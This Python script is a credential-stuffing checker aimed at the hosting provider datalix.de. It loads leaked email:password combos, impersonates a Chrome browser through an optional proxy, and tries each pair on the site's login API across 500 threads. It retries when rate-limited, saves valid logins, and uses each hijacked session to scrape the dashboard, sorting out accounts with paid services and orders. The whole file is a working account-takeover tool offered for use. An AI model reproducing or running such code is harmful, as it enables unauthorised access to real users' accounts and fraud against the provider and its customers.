import concurrent.futures
import threading, concurrent.futures
from colorama import Fore
import curl_cffi
from itertools import cycle 
import curl_cffi.requests
def between(text, a, b, i=1) -> str:
        return text.split(a)[i].split(b)[0]
class datalix:
    def __init__(self):
        self.session = curl_cffi.requests.Session(
            impersonate="chrome",
        )
        self.session.headers =  {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://datalix.de',
            'pragma': 'no-cache',
            'prefer': 'safe',
            'priority': 'u=1, i',
            'referer': 'https://datalix.de/',
            'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
        }
        self.prox = "" # proxy here
        self.proxy = {
            "http": self.prox,
            "https": self.prox
        }
        self.session.proxies = self.proxy
    def check(self, username, password):
        data = {
            'email': username,
            'password': password,
        }
        r = self.session.post('https://backend.datalix.de/v1/user/login', data=data)
        if '{"id":' in r.text:
            print(f'{Fore.GREEN}[+] Valid: {username}:{password} {Fore.RESET}')
            with open("valid_accounts.txt", "a") as file:
                file.write(f"{username}:{password}\n")
            json = r.json()
            session = json.get("id")
            self.session.cookies.update({"session": session})
            rf = self.session.get('https://datalix.de/cp/')
            services = between(rf.text, '<div class="text-lg font-medium text-gray-700 dark:text-white" id="dashboard_products">', '</div>')
            orders = between(rf.text, '<div class="text-lg font-medium text-gray-700 dark:text-white" id="dashboard_orders">', '</div>')
            if services != "0" or orders != "0":
                print(f'{Fore.CYAN}[+] FOUND SERVICES: {username}:{password} with {services} Services and {orders} orders {Fore.RESET}')
                with open("paid_accounts.txt", "a") as file:
                    file.write(f"{username}:{password}:{services}:{orders}\n")
        elif '{"error":"Ihre E-Mail oder ihr Passwort sind falsch."}' in r.text:
            print(f'{Fore.RED}[-] Invalid: {username}:{password} {Fore.RESET}')
        elif "429 Too Many Requests" in r.text:
            self.check(username, password)
        elif "2FA Code" in r.text:
            print(f'{Fore.RED}[-] 2FA: {username}:{password} {Fore.RESET}')
        else:
            print(r.text)

if __name__ == "__main__":
    with open('combo.txt', encoding="utf-8") as file:
        accounts=file.read().splitlines()
    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as thread:
        for account in accounts:
            try:
                if ":" in account:
                    user, passw=account.split(':')
            except:
                continue
            thread.submit(datalix().check, user, passw)